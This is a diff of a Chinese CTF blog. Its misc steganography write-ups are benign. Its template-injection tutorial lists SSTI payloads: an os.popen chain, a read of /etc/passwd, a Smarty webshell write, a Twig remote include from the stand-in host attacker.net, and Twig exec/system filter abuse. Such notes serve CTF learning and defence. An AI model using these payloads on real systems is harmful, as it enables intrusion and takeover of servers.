+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
+<p>水平有限，还是手敲罢</p>
+<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
+<p>鉴定为图片纯纯的诈骗（恼</p>
+<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
+<p>要画图，那么应该藏了坐标，010查一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
+<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
+<blockquote>
+<p>随波逐流</p>
+</blockquote>
+<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
+<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
+<blockquote>
+<p>脚本画图</p>
+</blockquote>
+<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
+<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
+<p>​	<code>*gnuplot*</code>绘图</p>
+<p>贴个脚本先</p>
+<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
+    re = res.read()
+    res.close()
+    
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        for j in range(0, len(tem)):
+            if tem[j] == &#x27;,&#x27;:
+                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()</code></pre>
+
+<p>得到去括号，去逗号的坐标值</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
+<p>贴一下ubuntu下的下载和使用方法</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
+gnuplot
+plot <span class="string">&quot;output.txt&quot;</span></code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
+<p>可以扫出来</p>
+<p>​	<em>matplotlib</em>绘图</p>
+<p>把原文本去括号，用脚本跑</p>
+<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
+import numpy as np
+with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
+    re = res.read()
+    res.close()
+
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()
+x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
+plt.plot(x, y, &#x27;.&#x27;)
+plt.show()</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -789,168 +1157,6 @@ flag = long_to_bytes(m)
 ]]></content>
       <tags>
         <tag>-WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU—MISC刷题记录</title>
-    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
-<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
-<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
-<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
-<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
-<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
-<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
-<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
-<p>主要是HTTP流量，直接追踪流</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
-<p>用<code>captfencoder</code>MD5一下结束战斗</p>
-<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
-<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
-<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
-<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
-<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
-<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
-<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
-<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
-<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
-<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
-<p>查完没有藏文件，那应该就是隐写了</p>
-<p>结果没有发现隐写，感觉被骗了</p>
-<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
-<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
-<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
-<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
-<p>成功了，打开提取的文件发现有PK头</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
-<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
-<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
-<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
-<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
-<p>foremost出一下，要密码，先尝试弱密码爆破</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
-<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
-<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
-<p>看来是改了后缀，010先查查看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
-<p>演都不演了…</p>
-<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
-<p>盯完帧没有东西，看看副本，发现已经损坏</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
-<p>（这里-其实是_）</p>
-<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
-<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
-<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
-<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
-<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
-<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
-<blockquote>
-<p>[!NOTE]</p>
-<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
-</blockquote>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
-<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
-<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
-crc32 flag.jpg</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
-<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
-<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
-<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
-<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
-<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
-<p>水平有限，还是手敲罢</p>
-<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
-<p>鉴定为图片纯纯的诈骗（恼</p>
-<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
-<p>要画图，那么应该藏了坐标，010查一下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
-<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
-<blockquote>
-<p>随波逐流</p>
-</blockquote>
-<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
-<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
-<blockquote>
-<p>脚本画图</p>
-</blockquote>
-<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
-<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
-<p>​	<code>*gnuplot*</code>绘图</p>
-<p>贴个脚本先</p>
-<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
-    re = res.read()
-    res.close()
-    
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        for j in range(0, len(tem)):
-            if tem[j] == &#x27;,&#x27;:
-                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()</code></pre>
-
-<p>得到去括号，去逗号的坐标值</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
-<p>贴一下ubuntu下的下载和使用方法</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
-gnuplot
-plot <span class="string">&quot;output.txt&quot;</span></code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
-<p>可以扫出来</p>
-<p>​	<em>matplotlib</em>绘图</p>
-<p>把原文本去括号，用脚本跑</p>
-<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
-import numpy as np
-with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
-    re = res.read()
-    res.close()
-
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()
-x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
-plt.plot(x, y, &#x27;.&#x27;)
-plt.show()</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -3694,12 +3900,29 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 
 post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()</code></pre>
 
-
-
 <h4 id="打马环节-待补完"><a href="#打马环节-待补完" class="headerlink" title="打马环节(待补完)"></a>打马环节(待补完)</h4><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><pre><code class="highlight plaintext">神必龙卷风</code></pre>
 
+<h4 id="基础了解"><a href="#基础了解" class="headerlink" title="基础了解"></a>基础了解</h4><p><code>Tornado</code>是一个具有异步功能的简单web框架</p>
+<pre><code class="highlight python"><span class="keyword">import</span> tornado.ioloop
+<span class="keyword">import</span> tornado.web
 
+<span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):
+    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):
+        <span class="variable language_">self</span>.write(<span class="string">&quot;Hello, world&quot;</span>)
 
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    application = tornado.web.Application([
+        (<span class="string">r&quot;/&quot;</span>, MainHandler),
+    ])
+    application.listen(<span class="number">8888</span>)
+    tornado.ioloop.IOLoop.current().start()</code></pre>
+
+<p>它使用<code>RequestHandler</code>来处理发送过来的web请求</p>
+<h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>这里大部分的payload是万卷不离其宗的(指继承链)</p>
+<p>如果要谈特性</p>
+<p>大概是<code>application</code></p>
+<p>因为<code>Tornado</code>模板一般需要引入<code>Tornado.web</code></p>
+<p>而在<code>Tornado.web.application</code>下就可以发现框架的<code>settings</code></p>
 <h2 id="PHP模板注入"><a href="#PHP模板注入" class="headerlink" title="PHP模板注入"></a>PHP模板注入</h2><p>php常见的模板：twig，smarty，blade</p>
 <h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
 <p>基本确定指令</p>
@@ -3800,7 +4023,233 @@ smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class
 <span class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span>
 &#123;<span class="keyword">if</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[cmd]);&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</code></pre>
 
-<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3>]]></content>
+<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3><h4 id="语法结构-1"><a href="#语法结构-1" class="headerlink" title="语法结构"></a>语法结构</h4><p>有两种形式的分隔符：<code>&#123;% ... %&#125;</code> 和 <code>&#123;&#123; ... &#125;&#125;</code>。前者用于执行语句，例如 <code>for</code> 循环，后者用于将表达式的结果输出到模板中。</p>
+<p>应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 <code>.</code> 来访问变量中的属性（方法或 PHP 对象的属性，或 PHP 数组单元），也可以使用所谓的 “subscript” 语法 <code>[]</code>:</p>
+<pre><code class="highlight plaintext">&#123;&#123; foo.bar &#125;&#125;
+&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</code></pre>
+
+<p><strong>设置变量</strong></p>
+<p>为模块代码内变量赋值时使用<code>set</code>标签</p>
+<pre><code class="highlight plaintext">&#123;% set foo = &#x27;foo&#x27; %&#125;
+&#123;% set foo = [1, 2] %&#125;
+&#123;% set foo = &#123;&#x27;foo&#x27;: &#x27;bar&#x27;&#125; %&#125;</code></pre>
+
+<p><strong>过滤器</strong></p>
+<p>twig还提供了过滤器来修改模板中的变量。在过滤器中，变量与一个或多个过滤器间使用|分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中。</p>
+<p>下面这个过滤器的例子会剥去字符串变量 <code>name</code> 中的 HTML 标签，然后将其转化为大写字母开头的格式:</p>
+<pre><code class="highlight plaintext">&#123;&#123; name|striptags|title &#125;&#125;
+
+// &#123;&#123; &#x27;&lt;a&gt;whoami&lt;a&gt;&#x27;|striptags|title &#125;&#125;
+// Output: Whoami!</code></pre>
+
+<p>下面这个过滤器将接收一个序列 <code>list</code>，然后使用 <code>join</code> 中指定的分隔符将序列中的项合并成一个字符串：</p>
+<pre><code class="highlight plaintext">&#123;&#123; list|join &#125;&#125;
+&#123;&#123; list|join(&#x27;, &#x27;) &#125;&#125;
+
+// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join &#125;&#125;
+// Output: abc
+
+// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join(&#x27;|&#x27;) &#125;&#125;
+// Output: a|b|c</code></pre>
+
+<p><strong>函数</strong></p>
+<p>在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了 <code>range()</code> 函数用来返回一个包含整数等差数列的列表：</p>
+<pre><code class="highlight plaintext">&#123;% for i in range(0, 3) %&#125;
+    &#123;&#123; i &#125;&#125;,
+&#123;% endfor %&#125;
+
+// Output: 0, 1, 2, 3,</code></pre>
+
+<p><strong>引入其他模板</strong></p>
+<p>Twig 提供的 <code>include</code> 函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板：</p>
+<pre><code class="highlight plaintext">&#123;&#123; include(&#x27;sidebar.html&#x27;) &#125;&#125;</code></pre>
+
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><h5 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h5><p>在 Twig 1.x 中存在三个全局变量：</p>
+<ul>
+<li><code>_self</code>：引用当前模板的实例。</li>
+<li><code>_context</code>：引用当前上下文。</li>
+<li><code>_charset</code>：引用当前字符集。</li>
+</ul>
+<p>对应的代码是：</p>
+<pre><code class="highlight plaintext">protected $specialVars = [
+        &#x27;_self&#x27; =&gt; &#x27;$this&#x27;,
+        &#x27;_context&#x27; =&gt; &#x27;$context&#x27;,
+        &#x27;_charset&#x27; =&gt; &#x27;$this-&gt;env-&gt;getCharset()&#x27;,
+    ];</code></pre>
+
+<p>这里主要就是利用 <code>_self</code> 变量，它会返回当前 <code>\Twig\Template</code> 实例，并提供了指向 <code>Twig_Environment</code> 的 <code>env</code> 属性，这样我们就可以继续调用 <code>Twig_Environment</code> 中的其他方法，从而进行 SSTI。</p>
+<p>比如以下 Payload 可以调用 <code>setCache</code> 方法改变 Twig 加载 PHP 文件的路径，在 <code>allow_url_include</code> 开启的情况下我们可以通过改变路径实现远程文件包含：</p>
+<pre><code class="highlight plaintext">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</code></pre>
+
+<p>此外还有 <code>getFilter</code> 方法：</p>
+<pre><code class="highlight plaintext">public function getFilter($name)
+  &#123;
+    ...
+    foreach ($this-&gt;filterCallbacks as $callback) &#123;
+    if (false !== $filter = call_user_func($callback, $name)) &#123;
+      return $filter;
+    &#125;
+  &#125;
+  return false;
+&#125;
+
+public function registerUndefinedFilterCallback($callable)
+&#123;
+  $this-&gt;filterCallbacks[] = $callable;
+&#125;</code></pre>
+
+<p>我们在 <code>getFilter</code> 里发现了危险函数 <code>call_user_func</code>。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
+<pre><code class="highlight plaintext">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;
+// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+<p>但是在 Twig 2.x 及 Twig 3.x 以后，<code>_self</code> 的作用发生了变化，只能返回当前实例名字符串：</p>
+<h5 id="Twig-2-x-3-x"><a href="#Twig-2-x-3-x" class="headerlink" title="Twig 2.x &#x2F; 3.x"></a>Twig 2.x &#x2F; 3.x</h5><p>到了 Twig 2.x &#x2F; 3.x 版本中，<code>__self</code> 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。</p>
+<p><strong>map</strong></p>
+<p>进行一个映射关系</p>
+<pre><code class="highlight plaintext">map 过滤器将箭头函数应用于序列或映射的元素。箭头函数接收序列或映射的值
+
+&#123;% set people = [
+    &#123;first: &quot;Bob&quot;, last: &quot;Smith&quot;&#125;,
+    &#123;first: &quot;Alice&quot;, last: &quot;Dupond&quot;&#125;,
+] %&#125;
+
+&#123;&#123; people|map(p =&gt; &quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
+&#123;# outputs Bob Smith, Alice Dupond #&#125;
+箭头函数还将键作为第二个参数接收
+
+&#123;% set people = &#123;
+    &quot;Bob&quot;: &quot;Smith&quot;,
+    &quot;Alice&quot;: &quot;Dupond&quot;,
+&#125; %&#125;
+
+&#123;&#123; people|map((value, key) =&gt; &quot;#&#123;key&#125; #&#123;value&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
+&#123;# outputs Bob Smith, Alice Dupond #&#125;
+请注意，箭头函数可以访问当前上下文。</code></pre>
+
+<p>也就是说当我们使用<code>map</code>时</p>
+<p><code>&#123;&#123;["Mark"]|map((arg)=>"Hello #&#123;arg&#125;!")&#125;&#125;</code>会被编译成<code>twig_array_map([0 =&gt; &quot;Mark&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__; return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))&#125;)</code></p>
+<p>这个 <code>twig_array_map</code> 函数的源码如下：</p>
+<pre><code class="highlight plaintext">function twig_array_map($array, $arrow)
+&#123;
+    $r = [];
+    foreach ($array as $k =&gt; $v) &#123;
+        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
+    &#125;
+
+    return $r;
+&#125;</code></pre>
+
+<p>从上面的代码我们可以看到，传入的 <code>$arrow</code> 直接就被当成函数执行，即 <code>$arrow($v, $k)</code>，而 <code>$v</code> 和 <code>$k</code> 分别是 <code>$array</code> 中的 value 和 key。<code>$array</code> 和 <code>$arrow</code> 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行</p>
+<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;]|map(&quot;passthru&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;]|map(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
+
+<p>如果函数被禁止了也可以通过写马来进行RCE</p>
